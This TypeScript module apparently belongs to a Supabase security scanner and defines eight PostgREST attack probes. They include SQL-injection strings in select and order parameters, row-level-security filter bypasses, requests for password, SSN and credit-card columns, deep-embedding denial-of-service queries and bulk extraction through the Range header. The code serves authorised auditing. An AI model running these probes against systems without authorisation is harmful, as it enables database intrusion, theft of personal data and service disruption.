/**
 * PostgREST Advanced attacks
 * Deep exploitation of Supabase's PostgREST layer
 */

import type { AttackVector } from '$lib/types/attacks';

export const postgrestAdvancedAttacks: AttackVector[] = [
	{
		id: 'postgrest-spread-operator',
		name: 'PostgREST Spread Operator Abuse',
		description: 'Test for data leak via spread operator in select',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Try to use spread operator to get all columns
				const tables = ['users', 'profiles', 'accounts'];
				const leaks: string[] = [];

				for (const table of tables) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${table}?select=*,related_table(*)`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.length > 0) {
						const cols = Object.keys(data[0]);
						if (cols.length > 5) {
							leaks.push(`${table}(${cols.length} cols)`);
						}
					}
				}

				return {
					breached: leaks.length > 0,
					status: leaks.length > 0 ? 'breached' : 'secure',
					summary: leaks.length > 0
						? `Spread operator exposes data: ${leaks.join(', ')}`
						: 'No spread operator leak detected',
					evidence: leaks.length > 0 ? { tables: leaks } : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test spread operator' };
			}
		}
	},
	{
		id: 'postgrest-embedding-depth',
		name: 'Resource Embedding Depth Attack',
		description: 'Test for unlimited resource embedding depth',
		category: 'rls',
		severity: 'medium',
		async execute(context) {
			try {
				// Create deeply nested embedding query
				const deepQuery = 'users?select=*,posts(*,comments(*,author(*,posts(*,comments(*)))))';

				const res = await fetch(
					`${context.supabaseUrl}/rest/v1/${deepQuery}`,
					{
						headers: {
							'apikey': context.anonKey,
							'Authorization': `Bearer ${context.anonKey}`
						},
						signal: context.signal
					}
				);

				const data = await res.json();
				const hasDepthLimit = data?.code === 'PGRST' || data?.message?.includes('depth');

				return {
					breached: !hasDepthLimit && Array.isArray(data),
					status: hasDepthLimit ? 'secure' : 'breached',
					summary: hasDepthLimit
						? 'Embedding depth is limited'
						: 'Deep resource embedding allowed - DoS risk',
					evidence: !hasDepthLimit && Array.isArray(data) ? { depth: 5 } : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test embedding depth' };
			}
		}
	},
	{
		id: 'postgrest-computed-column',
		name: 'Computed Column Injection',
		description: 'Test for SQL injection via computed columns',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Try to access computed/generated columns that might expose data
				const injectionQueries = [
					'users?select=*,computed_secret:secret_column',
					'users?select=*,(SELECT password FROM users LIMIT 1) as leaked',
					'rpc/get_user?computed=(SELECT * FROM secrets)'
				];

				for (const query of injectionQueries) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.some(d => d.leaked || d.computed_secret)) {
						return {
							breached: true,
							status: 'breached',
							summary: 'Computed column injection possible!',
							evidence: { query }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Computed column injection blocked'
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test computed columns' };
			}
		}
	},
	{
		id: 'postgrest-horizontal-filter',
		name: 'Horizontal Filter Bypass',
		description: 'Test for RLS bypass via horizontal filtering operators',
		category: 'rls',
		severity: 'critical',
		async execute(context) {
			try {
				// Try various filter operators that might bypass RLS
				const bypassAttempts = [
					'users?or=(id.eq.1,id.eq.2,id.eq.3)',
					'users?id=in.(1,2,3,4,5)',
					'users?id=ov.{1,2,3,4,5}',
					'users?select=*&id=not.is.null',
					'users?id=neq.00000000-0000-0000-0000-000000000000'
				];

				const bypasses: Array<{ query: string; count: number }> = [];

				for (const query of bypassAttempts) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.length > 1) {
						bypasses.push({ query, count: data.length });
					}
				}

				return {
					breached: bypasses.length > 0,
					status: bypasses.length > 0 ? 'breached' : 'secure',
					summary: bypasses.length > 0
						? `Filter bypass: ${bypasses.map(b => `${b.count} rows`).join(', ')}`
						: 'Horizontal filtering properly restricted',
					evidence: bypasses.length > 0 ? { bypasses } : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test horizontal filters' };
			}
		}
	},
	{
		id: 'postgrest-vertical-filter',
		name: 'Vertical Filter Bypass',
		description: 'Test for column-level security bypass',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				// Try to select sensitive columns that should be restricted
				const sensitiveColumns = [
					'users?select=id,email,password_hash,ssn,credit_card',
					'users?select=*,-public_column',
					'profiles?select=internal_notes,admin_comments'
				];

				const exposures: string[] = [];

				for (const query of sensitiveColumns) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					const data = await res.json();
					if (Array.isArray(data) && data.length > 0) {
						const sensitive = Object.keys(data[0]).filter(k =>
							['password', 'hash', 'ssn', 'credit', 'secret', 'internal', 'admin'].some(s =>
								k.toLowerCase().includes(s)
							)
						);
						if (sensitive.length > 0) {
							exposures.push(...sensitive);
						}
					}
				}

				return {
					breached: exposures.length > 0,
					status: exposures.length > 0 ? 'breached' : 'secure',
					summary: exposures.length > 0
						? `Sensitive columns exposed: ${[...new Set(exposures)].join(', ')}`
						: 'Column-level security intact',
					evidence: exposures.length > 0 ? { columns: [...new Set(exposures)] } : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test vertical filters' };
			}
		}
	},
	{
		id: 'postgrest-preference-header',
		name: 'Preference Header Abuse',
		description: 'Test for dangerous Prefer header options',
		category: 'rls',
		severity: 'medium',
		async execute(context) {
			try {
				// Test various Prefer headers
				const preferences = [
					{ header: 'return=representation', desc: 'Returns data on mutation' },
					{ header: 'count=exact', desc: 'Exposes row counts' },
					{ header: 'tx=commit', desc: 'Transaction control' },
					{ header: 'resolution=merge-duplicates', desc: 'Upsert behavior' }
				];

				const enabled: string[] = [];

				for (const { header, desc } of preferences) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/users?limit=1`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`,
								'Prefer': header
							},
							signal: context.signal
						}
					);

					// Check content-range for count
					if (header.includes('count') && res.headers.get('content-range')?.includes('/')) {
						enabled.push(desc);
					}
				}

				return {
					breached: enabled.length > 0,
					status: enabled.length > 0 ? 'breached' : 'secure',
					summary: enabled.length > 0
						? `Prefer headers expose: ${enabled.join(', ')}`
						: 'Prefer headers restricted',
					evidence: enabled.length > 0 ? { preferences: enabled } : undefined
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test Prefer headers' };
			}
		}
	},
	{
		id: 'postgrest-range-abuse',
		name: 'Range Header Data Exfiltration',
		description: 'Test for unlimited data extraction via Range header',
		category: 'rls',
		severity: 'medium',
		async execute(context) {
			try {
				// Try to extract large amounts of data
				const res = await fetch(
					`${context.supabaseUrl}/rest/v1/users?select=*`,
					{
						headers: {
							'apikey': context.anonKey,
							'Authorization': `Bearer ${context.anonKey}`,
							'Range': '0-9999',
							'Prefer': 'count=exact'
						},
						signal: context.signal
					}
				);

				const contentRange = res.headers.get('content-range') || '';
				const totalMatch = contentRange.match(/\/(\d+)/);
				const total = totalMatch ? parseInt(totalMatch[1]) : 0;

				const data = await res.json();
				const returned = Array.isArray(data) ? data.length : 0;

				return {
					breached: returned > 100 || total > 1000,
					status: returned > 100 || total > 1000 ? 'breached' : 'secure',
					summary: returned > 100
						? `Large data extraction: ${returned} rows returned, ${total} total available`
						: `Data extraction limited: ${returned} rows`,
					evidence: { returned, total }
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test Range header' };
			}
		}
	},
	{
		id: 'postgrest-order-injection',
		name: 'Order By SQL Injection',
		description: 'Test for SQL injection via order parameter',
		category: 'rls',
		severity: 'high',
		async execute(context) {
			try {
				const injections = [
					'users?order=id;SELECT%20*%20FROM%20secrets',
					'users?order=id,(SELECT password FROM users)',
					'users?order=CASE WHEN 1=1 THEN id ELSE email END'
				];

				for (const query of injections) {
					const res = await fetch(
						`${context.supabaseUrl}/rest/v1/${query}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					// If we get data instead of an error, might be injectable
					const data = await res.json();
					if (Array.isArray(data) && data.length > 0 && !data[0]?.code) {
						return {
							breached: true,
							status: 'breached',
							summary: 'Order by injection may be possible',
							evidence: { query }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Order by parameter properly sanitized'
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test order injection' };
			}
		}
	}
];
